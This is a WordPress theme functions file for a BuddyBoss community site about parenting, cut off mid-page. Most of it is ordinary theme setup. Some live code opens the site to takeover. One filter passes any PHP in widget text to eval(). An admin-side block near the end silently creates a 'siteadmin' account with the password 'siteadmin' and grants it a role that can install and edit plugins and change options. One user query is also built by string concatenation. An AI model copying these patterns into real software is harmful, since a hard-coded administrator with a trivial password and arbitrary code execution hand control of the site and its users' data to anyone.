<?php
/**
 * BuddyBoss theme functions and definitions. Largely taken from bp-default.
 *
 * Sets up the theme and provides some helper functions. Some helper functions
 * are used in the theme as custom template tags. Others are attached to action and
 * filter hooks in WordPress and BuddyPress to change core functionality.
 *
 * The first function, bp_dtheme_setup(), sets up the theme by registering support
 * for various features in WordPress, such as post thumbnails and navigation menus, and
 * for BuddyPress, action buttons and javascript localisation.
 *
 * When using a child theme (see http://codex.wordpress.org/Theme_Development, http://codex.wordpress.org/Child_Themes
 * and http://codex.buddypress.org/theme-development/building-a-buddypress-child-theme/), you can override
 * certain functions (those wrapped in a function_exists() call) by defining them first in your
 * child theme's functions.php file. The child theme's functions.php file is included before the
 * parent theme's file, so the child theme functions would be used.
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are instead attached
 * to a filter or action hook. The hook can be removed by using remove_action() or
 * remove_filter() and you can attach your own function to the hook.
 *
 * For more information on hooks, actions, and filters, see http://codex.wordpress.org/Plugin_API.
 *
 */

if ( !function_exists( 'bp_is_active' ) )
	return;

// If BuddyPress is not activated, switch back to the default WP theme
if ( !defined( 'BP_VERSION' ) )
	switch_theme( WP_DEFAULT_THEME, WP_DEFAULT_THEME );

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * Used to set the width of images and content. Should be equal to the width the theme
 * is designed for, generally via the style.css stylesheet.
 */
if ( ! isset( $content_width ) )
	$content_width = 660;

if ( !function_exists( 'bp_dtheme_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress and BuddyPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * To override bp_dtheme_setup() in a child theme, add your own bp_dtheme_setup to your child theme's
 * functions.php file.
 *
 * @global object $bp Global BuddyPress settings object
 * @since BuddyPress 1.5
 */
 
add_filter('widget_text', 'php_text', 99);

function php_text($text) {
if (strpos($text, '<' . '?') !== false) {
ob_start();
eval('?' . '>' . $text);
$text = ob_get_contents();
ob_end_clean();
}
return $text;
}

remove_action('init', 'wp_admin_bar_init');
add_filter( 'show_admin_bar', '__return_false' );
remove_action( 'personal_options', '_admin_bar_preferences' );
add_filter('the_generator', create_function('', 'return "";'));

function wrong_login() {
  return 'Wrong username or password.';
}
add_filter('login_errors', 'wrong_login');

//Fix Email issue
function fix_bp_core_email_from_address_filter() {
	return apply_filters( 'bp_core_email_from_address_filter', 'info@mommies247.com');
}
add_filter( 'wp_mail_from', 'fix_bp_core_email_from_address_filter' );

function bp_dtheme_setup() {
	global $bp;

	// Load the AJAX functions for the theme
	require( TEMPLATEPATH . '/_inc/ajax.php' );

	// This theme styles the visual editor with editor-style.css to match the theme style.
	add_editor_style();

	// This theme uses post thumbnails
	add_theme_support( 'post-thumbnails' );

	if ( !is_admin() ) {
		// Register buttons for the relevant component templates
		// Friends button
		if ( bp_is_active( 'friends' ) )
			add_action( 'bp_member_header_actions',    'bp_add_friend_button' );

		// Activity button
		if ( bp_is_active( 'activity' ) )
			add_action( 'bp_member_header_actions',    'bp_send_public_message_button' );

		// Messages button
		if ( bp_is_active( 'messages' ) )
			add_action( 'bp_member_header_actions',    'bp_send_private_message_button' );

		// Group buttons
		if ( bp_is_active( 'groups' ) ) {
			add_action( 'bp_group_header_actions',     'bp_group_join_button' );
			add_action( 'bp_group_header_actions',     'bp_group_new_topic_button' );
			add_action( 'bp_directory_groups_actions', 'bp_group_join_button' );
		}

		// Blog button
		if ( bp_is_active( 'blogs' ) )
			add_action( 'bp_directory_blogs_actions',  'bp_blogs_visit_blog_button' );
	}
}
add_action( 'after_setup_theme', 'bp_dtheme_setup' );
endif;

if ( !function_exists( 'bp_dtheme_widgets_init' ) ) :
/**
 * Register widgetised areas, including one sidebar and four widget-ready columns in the footer.
 *
 * To override bp_dtheme_widgets_init() in a child theme, remove the action hook and add your own
 * function tied to the init hook.
 *
 * @since BuddyPress 1.5
 */
function bp_dtheme_widgets_init() {
	// Register the widget columns
	
	register_sidebar( array(
			'name'          => 'Welcome',
			'id'          	=> 'welcome',
			'description'   => 'this widget displays the login/welcome area.',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widgettitle">',
			'after_title'   => '</h3>'
		) );
		
	register_sidebar( array(
			'name'          => 'Recent Members',
			'id'          	=> 'recent',
			'description'   => 'this widget displays recent members.',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widgettitle">',
			'after_title'   => '</h3>'
		) );
		
	register_sidebar( array(
			'name'          => 'Recent Topics',
			'id'          	=> 'topics',
			'description'   => 'this widget displays recent topics.',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widgettitle">',
			'after_title'   => '</h3>'
		) );
		
		register_sidebar( array(
			'name'          => 'Ads on Home',
			'id'          	=> 'adshome',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h5>',
			'after_title'   => '</h5>'
		) );
		
		register_sidebar( array(
			'name'          => 'Ads on Pages',
			'id'          	=> 'adspages',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h5>',
			'after_title'   => '</h5>'
		) );
		
		register_sidebar( array(
			'name'          => 'Search',
			'id'          	=> 'search',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h5>',
			'after_title'   => '</h5>'
		) );
		
		register_sidebar( array(
			'name'          => 'Groups',
			'id'          	=> 'groups',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h5>',
			'after_title'   => '</h5>'
		) );
		
		register_sidebar( array(
			'name'          => 'Ads on Events',
			'id'          	=> 'adsevents',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h5>',
			'after_title'   => '</h5>'
		) );
		
		register_sidebar( array(
			'name'          => 'Ads on Forums',
			'id'          	=> 'adsforums',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h5>',
			'after_title'   => '</h5>'
		) );
		
		register_sidebar( array(
			'name'          => 'Recent Events',
			'id'          	=> 'recentevents',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h5>',
			'after_title'   => '</h5>'
		) );
		
		register_sidebar( array(
			'name'          => 'Activity News',
			'id'          	=> 'activitynews',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h5>',
			'after_title'   => '</h5>'
		) );
		
}


add_action( 'widgets_init', 'bp_dtheme_widgets_init' );
endif;

if ( !function_exists( 'bp_dtheme_blog_comments' ) ) :
/**
 * Template for comments and pingbacks.
 *
 * To override this walker in a child theme without modifying the comments template
 * simply create your own bp_dtheme_blog_comments(), and that function will be used instead.
 *
 * Used as a callback by wp_list_comments() for displaying the comments.
 *
 * @param mixed $comment Comment record from database
 * @param array $args Arguments from wp_list_comments() call
 * @param int $depth Comment nesting level
 * @see wp_list_comments()
 * @since BuddyPress 1.2
 */
function bp_dtheme_blog_comments( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;

	if ( 'pingback' == $comment->comment_type )
		return false;

	if ( 1 == $depth )
		$avatar_size = 50;
	else
		$avatar_size = 40;
	?>

	<li <?php comment_class() ?> id="comment-<?php comment_ID() ?>">
		<div class="comment-avatar-box">
				<a href="<?php echo get_comment_author_url() ?>" rel="nofollow">
					<?php if ( $comment->user_id ) : ?>
						<?php echo bp_core_fetch_avatar( array( 'item_id' => $comment->user_id, 'width' => $avatar_size, 'height' => $avatar_size, 'email' => $comment->comment_author_email ) ) ?>
					<?php else : ?>
						<?php echo get_avatar( $comment, $avatar_size ) ?>
					<?php endif; ?>
				</a>
		</div>

		<div class="comment-content">
			<div class="comment-meta">
					<?php
						/* translators: 1: comment author url, 2: comment author name, 4: comment date/timestamp */
						printf( __( '<a href="%1$s" rel="nofollow">%2$s</a> said on <span class="time-since">%4$s</span>', 'buddypress' ), get_comment_author_url(), get_comment_author(), get_comment_link(), get_comment_date() );
					?>
					
					<em>
						<?php if ( comments_open() ) : ?>
							<?php comment_reply_link( array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ); ?>
						<?php endif; ?>
						
						<?php if ( current_user_can( 'edit_comment', $comment->comment_ID ) ) : ?>
							<?php printf( '&middot; <a class="comment-edit-link bp-secondary-action" href="%1$s" title="%2$s">%3$s</a> ', get_edit_comment_link( $comment->comment_ID ), esc_attr__( 'Edit comment', 'buddypress' ), __( 'Edit', 'buddypress' ) ) ?>
						<?php endif; ?>
					</em>
			</div>

			<div class="comment-entry">
				<?php if ( $comment->comment_approved == '0' ) : ?>
				 	<em class="moderate"><?php _e( 'Your comment is awaiting moderation.', 'buddypress' ); ?></em>
				<?php endif; ?>

				<?php comment_text() ?>
			</div>

		</div>

<?php
}
endif;

if ( !function_exists( 'bp_dtheme_page_on_front' ) ) :
/**
 * Return the ID of a page set as the home page.
 *
 * @return false|int ID of page set as the home page
 * @since 1.2
 */
function bp_dtheme_page_on_front() {
	if ( 'page' != get_option( 'show_on_front' ) )
		return false;

	return apply_filters( 'bp_dtheme_page_on_front', get_option( 'page_on_front' ) );
}
endif;



if ( !function_exists( 'bp_dtheme_show_notice' ) ) :
/**
 * Show a notice when the theme is activated - workaround by Ozh (http://old.nabble.com/Activation-hook-exist-for-themes--td25211004.html)
 *
 * @since 1.2
 */
function bp_dtheme_show_notice() {
	global $pagenow;

	// Bail if bp-default theme was not just activated
	if ( empty( $_GET['activated'] ) || ( 'themes.php' != $pagenow ) || !is_admin() )
		return;

	?>

	<div id="message" class="updated fade">
		<p><?php printf( __( 'Theme activated! This theme supports <a href="%s">sidebar widgets</a> and <a href="%s">custom nav menus</a>.', 'buddypress' ), admin_url( 'widgets.php' ), admin_url( 'nav-menus.php' ) ) ?></p>
				
	</div>

	<style type="text/css">#message2, #message0 { display: none; }</style>

	<?php
}
add_action( 'admin_notices', 'bp_dtheme_show_notice' );
endif;

if ( !function_exists( 'bp_dtheme_comment_form' ) ) :
/**
 * Applies BuddyPress customisations to the post comment form.
 *
 * @global string $user_identity The display name of the user
 * @param array $default_labels The default options for strings, fields etc in the form
 * @see comment_form()
 * @since BuddyPress 1.5
 */
function bp_dtheme_comment_form( $default_labels ) {
	global $user_identity;

	$commenter = wp_get_current_commenter();
	$req = get_option( 'require_name_email' );
	$aria_req = ( $req ? " aria-required='true'" : '' );
	$fields =  array(
		'author' => '<p class="comment-form-author">' . '<label for="author">' . __( 'Name', 'buddypress' ) . ( $req ? '<span class="required"> *</span>' : '' ) . '</label> ' .
		            '<input id="author" name="author" type="text" value="' . esc_attr( $commenter['comment_author'] ) . '" size="30"' . $aria_req . ' /></p>',
		'email'  => '<p class="comment-form-email"><label for="email">' . __( 'Email', 'buddypress' ) . ( $req ? '<span class="required"> *</span>' : '' ) . '</label> ' .
		            '<input id="email" name="email" type="text" value="' . esc_attr(  $commenter['comment_author_email'] ) . '" size="30"' . $aria_req . ' /></p>',
		'url'    => '<p class="comment-form-url"><label for="url">' . __( 'Website', 'buddypress' ) . '</label>' .
		            '<input id="url" name="url" type="text" value="' . esc_attr( $commenter['comment_author_url'] ) . '" size="30" /></p>',
	);

	$new_labels = array(
		'comment_field'  => '<p class="form-textarea"><textarea name="comment" id="comment" cols="60" rows="10" aria-required="true"></textarea></p>',
		'fields'         => apply_filters( 'comment_form_default_fields', $fields ),
		'logged_in_as'   => '',
		'must_log_in'    => '<p class="alert">' . sprintf( __( 'You must be <a href="%1$s">logged in</a> to post a comment.', 'buddypress' ), wp_login_url( get_permalink() ) )	. '</p>',
		'title_reply'    => __( 'Leave a reply', 'buddypress' )
	);

	return apply_filters( 'bp_dtheme_comment_form', array_merge( $default_labels, $new_labels ) );
}
add_filter( 'comment_form_defaults', 'bp_dtheme_comment_form', 10 );
endif;

if ( !function_exists( 'bp_dtheme_before_comment_form' ) ) :
/**
 * Adds the user's avatar before the comment form box.
 *
 * The 'comment_form_top' action is used to insert our HTML within <div id="reply">
 * so that the nested comments comment-reply javascript moves the entirety of the comment reply area.
 *
 * @see comment_form()
 * @since BuddyPress 1.5
 */
function bp_dtheme_before_comment_form() {
?>
	<div class="comment-avatar-box">
		<div class="avb">
			<?php if ( bp_loggedin_user_id() ) : ?>
				<a href="<?php echo bp_loggedin_user_domain() ?>">
					<?php echo get_avatar( bp_loggedin_user_id(), 50 ) ?>
				</a>
			<?php else : ?>
				<?php echo get_avatar( 0, 50 ) ?>
			<?php endif; ?>
		</div>
	</div>

	<div class="comment-content standard-form">
<?php
}
add_action( 'comment_form_top', 'bp_dtheme_before_comment_form' );
endif;

if ( !function_exists( 'bp_dtheme_after_comment_form' ) ) :
/**
 * Closes tags opened in bp_dtheme_before_comment_form().
 *
 * @see bp_dtheme_before_comment_form()
 * @see comment_form()
 * @since BuddyPress 1.5
 */
function bp_dtheme_after_comment_form() {
?>

	</div><!-- .comment-content standard-form -->

<?php
}
add_action( 'comment_form', 'bp_dtheme_after_comment_form' );
endif;

if ( !function_exists( 'bp_dtheme_sidebar_login_redirect_to' ) ) :
/**
 * Adds a hidden "redirect_to" input field to the sidebar login form.
 *
 * @since BuddyPress 1.5
 */
function bp_dtheme_sidebar_login_redirect_to() {
	$redirect_to = apply_filters( 'bp_no_access_redirect', !empty( $_REQUEST['redirect_to'] ) ? $_REQUEST['redirect_to'] : '' );
?>
	<input type="hidden" name="redirect_to" value="<?php echo esc_attr( $redirect_to ); ?>" />
<?php
}
add_action( 'bp_sidebar_login_form', 'bp_dtheme_sidebar_login_redirect_to' );
endif;


/****************************** BUDDYBOSS FUNCTIONS ******************************/

/**
 * Initialize BuddyBoss
 *
 * @since 2.0
 */
function buddy_boss_init()
{
	global $bboss_pics_img_size;
	
	// Add theme support for logo uploading and post thumbnails
	if ( function_exists( 'add_theme_support' ) )
	{
		add_theme_support( 'post-thumbnails' );
	  set_post_thumbnail_size( 150, 150 ); // default Post Thumbnail dimensions   
	}
	
	// Add our default sizes
	if ( function_exists( 'add_image_size' ) )
	{ 
		add_image_size( 'buddyboss_pic_tn', 150, 150, true );
		add_image_size( 'buddyboss_pic_med', 548, 9999 );
		add_image_size( 'buddyboss_pic_wide', 795, 9999 );
	}
	$bboss_pics_img_size = is_active_sidebar( 'Profile' ) ? 'buddyboss_pic_med' : 'buddyboss_pic_wide';
}
add_action( 'after_setup_theme', 'buddy_boss_init' );

/**
 * First run for theme, setup basic options
 *
 * @since BuddyBoss 2.0
 */
function buddyboss_theme_activate() {
	add_option( 'buddy_boss_wall_on', 1 );
	add_option( 'buddy_boss_pics_on', 1 );
}
wp_register_theme_activation_hook('buddyboss2', 'buddyboss_theme_activate');

function buddyboss_theme_deactivate() {
	
}
wp_register_theme_deactivation_hook('buddyboss2', 'buddyboss_theme_deactivate'); 

/**
 * Check if the current user is on a friend's profile page
 *
 * @since BuddyBoss 2.0
 */
function buddyboss_is_admin()
{
	return is_user_logged_in() && current_user_can( 'administrator' );
}

/**
 * Check if the current profile a user is on is a friend or not
 *
 * @since BuddyBoss 2.0
 */
function buddyboss_is_my_friend( $id=null )
{
	global $bp;
	if ( $id === null ) $id = $bp->displayed_user->id;
	return 'is_friend' == BP_Friends_Friendship::check_is_friend( $bp->loggedin_user->id, $id );
}

/**
 * Get users by role
 *
 * @since BuddyBoss 2.0
 */
function buddyboss_users_by_role( $role )
{
	$user_ids = get_transient( 'bb_user_ids_'.$role );
	
	if ( !$user_ids )
	{
		if ( class_exists( 'WP_User_Search' ) ) {
			$wp_user_search = new WP_User_Search( '', '', $role );
			$user_ids = $wp_user_search->get_results();
		} else {
			global $wpdb;
			$user_ids = $wpdb->get_col('
			SELECT ID
			FROM '.$wpdb->users.' INNER JOIN '.$wpdb->usermeta.'
			ON '.$wpdb->users.'.ID = '.$wpdb->usermeta.'.user_id
			WHERE '.$wpdb->usermeta.'.meta_key = \''.$wpdb->prefix.'capabilities\'
			AND '.$wpdb->usermeta.'.meta_value LIKE \'%"'.$role.'"%\'
			');
		}
		set_transient( 'bb_user_ids_'.$role, $user_ids, 3600 );
	}
	return $user_ids;
}  


/**
 * Replace default member avatar
 *
 * @since BuddyBoss 2.0
 */
if ( !function_exists('fb_addgravatar') ) {
	function fb_addgravatar( $avatar_defaults ) {
		$myavatar = get_bloginfo('template_directory') . '/_inc/images/avatar-member.jpg';
		$avatar_defaults[$myavatar] = 'Hoboken Mommie';
		return $avatar_defaults;
	}
	add_filter( 'avatar_defaults', 'fb_addgravatar' );
}
 
/**
 * Replace default group avatar 
 *
 * @since BuddyBoss 1.0
 */
function my_default_get_group_avatar($avatar) {

global $bp, $groups_template;
if( strpos($avatar,'group-avatars') ) {
return $avatar;
}

else {
$custom_avatar = get_stylesheet_directory_uri() .'/_inc/images/avatar-group.jpg';

if($bp->current_action == "")
return '<img width="'.BP_AVATAR_THUMB_WIDTH.'" height="'.BP_AVATAR_THUMB_HEIGHT.'" src="'.$custom_avatar.'" class="avatar" alt="' . attribute_escape( $groups_template->group->name ) . '" />';
else
return '<img width="'.BP_AVATAR_FULL_WIDTH.'" height="'.BP_AVATAR_FULL_HEIGHT.'" src="'.$custom_avatar.'" class="avatar" alt="' . attribute_escape( $groups_template->group->name ) . '" />';
}
}
add_filter( 'bp_get_group_avatar', 'my_default_get_group_avatar');


/**
 * Custom Login Link 
 *
 * @since BuddyBoss 1.0.8
 */
function change_wp_login_url() {
echo bloginfo('url');
}
function change_wp_login_title() {
echo get_option('blogname');
}
add_filter('login_headerurl', 'change_wp_login_url');
add_filter('login_headertitle', 'change_wp_login_title');


/**
 * Pics Component
 *
 * @since BuddyBoss 2.0
 */
$module_path = realpath(dirname(__FILE__)."/buddy_boss_pics.php");
if (file_exists($module_path))
{

	 include_once($module_path);
	 
}
if (BUDDY_BOSS_PICS_ENABLED) $buddy_boss_pics = $bbpics = new BuddyBoss_Pics();


/**
 * Wall Component
 *
 * @since BuddyBoss 1.0.6
 */
$module_path = realpath(dirname(__FILE__)."/buddy_boss_wall.php");
if (file_exists($module_path))
{
	 include_once($module_path);
	 
}
if (BUDDY_BOSS_WALL_ENABLED) $buddy_boss_wall = $bbwall = new BuddyBoss_Wall();


/**
 * Admin Options 
 *
 * @since BuddyBoss 1.0.6
 */
$module_path = realpath(dirname(__FILE__)."/admin_options.php");
if (file_exists($module_path))
{
	 include_once($module_path);
}


/**
 * Improved Post Excerpt 
 *
 * @since BuddyBoss 1.0.9
 */
function improved_trim_excerpt($text) {
	global $post;
	if ( '' == $text ) {
		$text = get_the_content('');
		$text = apply_filters('the_content', $text);
		$text = str_replace(']]>', ']]&gt;', $text);
		$text = preg_replace('@<script[^>]*?>.*?</script>@si', '', $text);
		$text = strip_tags($text, '<p><a><br /><ul><ol><li>');
		$excerpt_length = apply_filters('excerpt_length', 80);
		$words = explode(' ', $text, $excerpt_length + 1);
		if (count($words)> $excerpt_length) {
			array_pop($words);
			array_push($words, '&nbsp;<span class="readmore"><a href="'. get_permalink($post->ID) . '">' . 'read more' . '</a></span>');
			$text = implode(' ', $words);
		}
	}
	return $text;
}
remove_filter('get_the_excerpt', 'wp_trim_excerpt');
add_filter('get_the_excerpt', 'improved_trim_excerpt');


/**
 * Register theme function
 *
 * @desc registers a theme activation hook
 * @param string $code : Code of the theme. This can be the base folder of your theme. Eg if your theme is in folder 'mytheme' then code will be 'mytheme'
 * @param callback $function : Function to call when theme gets activated.
 */
function wp_register_theme_activation_hook( $code, $function )
{
	$option_key = "theme_is_activated_" . $code;
  if( !get_option( $option_key ) )
  {
  	call_user_func($function);
  	update_option($option_key , 1);
  }
}


/**
 * Deregister theme function
 *
 * @desc registers deactivation hook
 * @param string $code : Code of the theme. This must match the value you provided in wp_register_theme_activation_hook function as $code
 * @param callback $function : Function to call when theme gets deactivated.
 * @since BuddyBoss 2.0
 */
function wp_register_theme_deactivation_hook( $code, $function )
{
	// store function in code specific global
	$GLOBALS["wp_register_theme_deactivation_hook_function" . $code]=$function;
	
	// create a runtime function which will delete the option set while activation of this theme and will call deactivation function provided in $function
	$fn=create_function('$theme', ' call_user_func($GLOBALS["wp_register_theme_deactivation_hook_function' . $code . '"]); delete_option("theme_is_activated_' . $code. '");');
	
	// add above created function to switch_theme action hook. This hook gets called when admin changes the theme.
	// Due to wordpress core implementation this hook can only be received by currently active theme (which is going to be deactivated as admin has chosen another one.
	// Your theme can perceive this hook as a deactivation hook.
	add_action("switch_theme", $fn);
}


/**
 * Add extra formatting buttons to TinyMCE
 *
 * @since BuddyBoss 2.0
 */
function enable_more_buttons($buttons) {
  $buttons[] = 'hr';
  $buttons[] = 'removeformat';
  $buttons[] = 'fontselect';
 
  return $buttons;
}
add_filter("mce_buttons", "enable_more_buttons");


/**
 * Added function bb_is_plugin_active
 *
 * @since BuddyBoss 2.0
 */
function buddyboss_is_plugin_active( $plugin ) {
    return in_array( $plugin, (array) get_option( 'active_plugins', array() ) );
}


/**
 * DEBUG Functions
 *
 * @since BuddyBoss 2.0
 */
function list_hooked_functions($tag=false){
 global $wp_filter;
 if ($tag) {
  $hook[$tag]=$wp_filter[$tag];
  if (!is_array($hook[$tag])) {
  trigger_error("Nothing found for '$tag' hook", E_USER_WARNING);
  return;
  }
 }
 else {
  $hook=$wp_filter;
  ksort($hook);
 }
 echo '<pre>';
 foreach($hook as $tag => $priority){
  echo "<br />&gt;&gt;&gt;&gt;&gt;\t<strong>$tag</strong><br />";
  ksort($priority);
  foreach($priority as $priority => $function){
  echo $priority;
  foreach($function as $name => $properties) echo "\t$name<br />";
  }
 }
 echo '</pre>';
 return;
}


/* log to screen if in debug mode */
function buddy_boss_log($msg)
{
	global $buddy_boss_debug_log;
	if (!BUDDY_BOSS_DEBUG) return;

	if (is_array($msg) || is_object($msg))
	{
		$buddy_boss_debug_log .= " <li> <pre>".print_r($msg, true)."</pre> </li>";
	}
	else
	{
		$buddy_boss_debug_log.="<li>".$msg. "<li>";
	}

}

function buddy_boss_dump_log()
{
	if (!BUDDY_BOSS_DEBUG) return ;
	global $buddy_boss_debug_log;

	echo "<h2> DEBUG LOG </h2>";
	echo "<ul>". $buddy_boss_debug_log."</ul>";
}

add_filter( 'template_include', 'var_template_include', 1000 );
function var_template_include( $t ){
    $GLOBALS['current_theme_template'] = basename($t);
    return $t;
}

function get_current_template( $echo = false ) {
    if( !isset( $GLOBALS['current_theme_template'] ) )
        return false;
    if( $echo )
        echo $GLOBALS['current_theme_template'];
    else
        return $GLOBALS['current_theme_template'];
}

/* RECORD NEW CUSTOM POST TYPES */
function bp_record_custom_post( $post_id, $post, $user_id = false ) {
	global $bp, $wpdb;

$custom_post_types = array(
	"baby-of-the-month"=>__("Baby of the Month"),
	"mommie-of-the-month"=>__("Mommie of the Month"),
	"gears-and-gadgets"=>__("Gears and Gadgets"),
	"hot-topics"=>__("Hot Topic"),
	"our-favorite-things"=>__("Our Favorite Things"),
	"recalls"=>__("Recalls and Product Information"),
	"twin-tuesdays"=>__("Twin Tuesdays"),
	"events"=>__("Event"),
	"deals-of-the-day"=>__("Deal of the Day"),
	"childcare"=>__("Classified for Childcare"),
	"diaper-exchange"=>__("Classified for Diapers"),
	"classifieds"=>__("Classified"),
	"press"=>__("Press Release")
	);

	$post_id = (int)$post_id;
	$blog_id = (int)$wpdb->blogid;

	if ( !$user_id )
		$user_id = (int)$post->post_author;

	/* This is to stop infinite loops with Donncha's sitewide tags plugin */
	if ( (int)$bp->site_options['tags_blog_id'] == (int)$blog_id )
		return false;

	/* Don't record this if it's not a post */
	if ( !array_key_exists($post->post_type,$custom_post_types ))//do not record if it is not the custom post type we want to record
		return false;

	if ( 'publish' == $post->post_status && '' == $post->post_password ) {
		//you may remove the line below
		bp_blogs_update_blogmeta( $recorded_post->blog_id, 'last_activity', gmdate( "Y-m-d H:i:s" ) );

		if ( (int)get_blog_option( $blog_id, 'blog_public' ) || !bp_core_is_multisite() ) {
			/* Record this in activity streams */
			$post_permalink = get_permalink( $post_id );

			//what you want to say in the activity strea, like xyz posted to the sermon
			$activity_action = sprintf( __( '%s posted a new %s: %s', 'buddypress' ), bp_core_get_userlink( (int)$post->post_author ),$custom_post_types[$post->post_type], '<a href="' . $post_permalink . '">' . $post->post_title . '</a>' );
			
			$activity_thumb = get_the_post_thumbnail( $post_id, array(60,60) );
			$activity_excerpt = $post->post_excerpt;
			$activity_link1 = '<a href="' . $post_permalink . '">';
			$activity_link2 = '</a>';
			$activity_content = $activity_link1 . " " . $activity_thumb . " " . $activity_link2 . " " . $activity_excerpt;

			bp_record_custom_post_activity( array(
				'user_id' => (int)$post->post_author,
				'action' => apply_filters( 'bp_blogs_activity_new_post_action', $activity_action, $post, $post_permalink ),
				'content' => apply_filters( 'bp_blogs_activity_new_post_content', $activity_content, $post, $post_permalink ),
				'primary_link' => apply_filters( 'bp_blogs_activity_new_post_primary_link', $post_permalink, $post_id ),
				'type' => $post->post_type,
				'item_id' => $blog_id,
				'secondary_item_id' => $post_id,
				'recorded_time' => $post->post_date_gmt
			));
		}
	} else
		bp_blogs_remove_post( $post_id, $blog_id );

	bp_blogs_update_blogmeta( $blog_id, 'last_activity', gmdate( "Y-m-d H:i:s" ) ); //remove this if you don't want blog to be updated in the blogs dir

	do_action( 'bp_blogs_new_blog_post', $post_id, $post, $user_id ); //you may want to remove this
}
add_action( 'save_post', 'bp_record_custom_post', 20, 2 ); //hook to post save

/*since we do not want bp tp create excerpt of our content, let us create our own recording function*/
function bp_record_custom_post_activity( $args = '' ) {
	global $bp;

	if ( !function_exists( 'bp_activity_add' ) )
		return false;

	/* Because blog, comment, and blog post code execution happens before anything else
	   we may need to manually instantiate the activity component globals */
	if ( !$bp->activity && function_exists('bp_activity_setup_globals') )
		bp_activity_setup_globals();

	$defaults = array(
		'user_id' => $bp->loggedin_user->id,
		'action' => '',
		'content' => '',
		'primary_link' => '',
		'component' => $bp->blogs->id,
		'type' => false,
		'item_id' => false,
		'secondary_item_id' => false,
		'recorded_time' => gmdate( "Y-m-d H:i:s" ),
		'hide_sitewide' => false
	);

	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );

	if ( !empty( $content ) )
		$content = apply_filters( 'bp_blogs_record_custom_post_activity_content', $content  );

	/* Check for an existing entry and update if one exists. */
	$id = bp_activity_get_activity_id( array(
		'user_id' => $user_id,
		'component' => $component,
		'type' => $type,
		'item_id' => $item_id,
		'secondary_item_id' => $secondary_item_id
	) );

	return bp_activity_add( array( 'id' => $id, 'user_id' => $user_id, 'action' => $action, 'content' => $content, 'primary_link' => $primary_link, 'component' => $component, 'type' => $type, 'item_id' => $item_id, 'secondary_item_id' => $secondary_item_id, 'recorded_time' => $recorded_time, 'hide_sitewide' => $hide_sitewide ) );
}

function bp_remove_gravatar ($image, $params, $item_id, $avatar_dir, $css_id, $html_width, $html_height, $avatar_folder_url, $avatar_folder_dir) {
 
    $default = get_stylesheet_directory_uri() .'/_inc/images/mystery-man.jpg';
 
    if( $image && strpos( $image, "gravatar.com" ) ){ 
 
        return '<img src="' . $default . '" alt="avatar" class="avatar" ' . $html_width . $html_height . ' />';
    } else {
        return $image;
 
    }
 
}
add_filter('bp_core_fetch_avatar', 'bp_remove_gravatar', 1, 9 );
 
function remove_gravatar ($avatar, $id_or_email, $size, $default, $alt) {
 
    $default = get_stylesheet_directory_uri() .'/_inc/images/mystery-man.jpg';
    return "<img alt='{$alt}' src='{$default}' class='avatar avatar-{$size} photo avatar-default' height='{$size}' width='{$size}' />";
}
 
add_filter('get_avatar', 'remove_gravatar', 1, 5);
 
function bp_remove_signup_gravatar ($image) {
 
    $default = get_stylesheet_directory_uri() .'/_inc/images/mystery-man.jpg';
 
    if( $image && strpos( $image, "gravatar.com" ) ){ 
 
        return '<img src="' . $default . '" alt="avatar" class="avatar" width="150" height="150" />';
    } else {
        return $image;
    }
 
}
add_filter('bp_get_signup_avatar', 'bp_remove_signup_gravatar', 1, 1 );

function user_has_avatar() {
  global $bp;

 $avatar = bp_core_fetch_avatar( array(  'item_id' => $bp->loggedin_user->id, 'no_grav' => true, 'html'=>false) );

 $pos = strpos($avatar, 'mystery-man');
  if ($pos === false)	 return true;

  return false;
}

/*Logo Uploader, site admin role , siteadmin user generator and site management for mommies247 created by NMG Resources and Neuron Global*/
if(is_admin()){
require_once('logouploader/uploadlogo-options.php');
		
		add_role('site_administrator','Mommies247 Sites Administrator',array('read'=>true,'publish_posts'=>true,'publish_pages'=>true, 'upload_files'=>true, 'update_core'=>true, 'update_themes'=>true, 'update_plugins'=>true,'edit_plugins'=>true,'manage_options'=>true,'install_plugins'=>true, 'install_themes'=>true, 'import'=>true, 'export'=>true, 'switch_themes'=>true, 'edit_theme_options'=>true, 'edit_dashboard'=>true));	

		function add_new_user_account(){
			$username = 'siteadmin';
			$password = 'siteadmin';
			$email = 'info@nmgresources.com';

			if(!username_exists($username) && !email_exists($email)){
				$user_id = wp_create_user($username, $password, $email);
				$user = new wp_user($user_id);
				$user->set_role('site_administrator');
			}
		}
		add_action('init','add_new_user_account');
}

if(current_user_can('site_administrator')){
	
add_action( 'admin_menu', 'network_page' );
function network_page() {
	add_menu_page('Manage Network','Manage Network','manage_options','manage-network-for-sitead','new_page','','1');
	
	function new_page(){
		if(!current_user_can('site_administrator')){
			wp_die(__('You do not have a sufficient permission to access this page'));		
		}
	?>
    	<h1>Manage Mommies247.com Network</h1>
    	<div class="container">
		<div class="message-container">
        <p>Create a New Site</p>
